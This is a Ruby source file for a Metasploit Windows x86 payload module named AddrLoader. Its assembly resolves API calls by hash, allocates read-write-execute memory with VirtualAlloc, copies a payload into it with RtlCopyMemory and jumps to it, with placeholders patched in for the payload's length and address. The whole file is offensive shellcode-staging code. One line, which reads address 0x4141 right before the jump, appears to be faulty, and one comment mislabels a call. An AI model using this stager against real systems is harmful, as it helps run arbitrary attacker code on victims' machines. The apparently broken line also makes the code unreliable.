# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'

module Msf

###
#
# Windows ARCH_X86 loader
#
###

module Payload::Windows::AddrLoader

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  #
  # Generate and compile the loader
  #
  def generate_loader
    combined_asm = %Q^
        cld                    ; Clear the direction flag.
        call start             ; Call start, this pushes the address of 'api_call' onto the stack.
        #{asm_block_api}
      start:
        pop ebp
        #{asm_block_loader}
    ^
    loader = Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
    offset_size = loader.index("AAAA")
    offset_addr = loader.index("BBBB")
    [ loader, offset_addr, offset_size ]
  end

  def asm_block_loader
    asm = %Q^
        call after_len          ; Call after_addr, this pushes the length onto the stack
        db 0x41, 0x41, 0x41, 0x41
      after_len:
        pop esi                 ; ESI = len
        mov esi, [esi]

        ; Allocate RWX memory
        push 0x40               ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; MEM_COMMIT
        push esi                ; length
        push 0                  ; NULL as we dont care where the allocation is.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp                ; VirtualAlloc( NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        mov ebx, eax

        call after_addr         ; Call after_addr, this pushes the address onto the stack.
        db 0x42, 0x42, 0x42, 0x42
      after_addr:
        pop edi                 ; EDI = addr
        mov edi, [edi]

        push esi                ; length
        push edi                ; the address to load from
        push eax                ; the rwx region
        push #{Rex::Text.block_api_hash('ntdll.dll', 'RtlCopyMemory')}
        call ebp                ; RtlCopyMemory(allocbuffer, buffer, length);

        push ebx
        mov eax, [0x4141]

        ret
    ^
    asm
  end

end

end
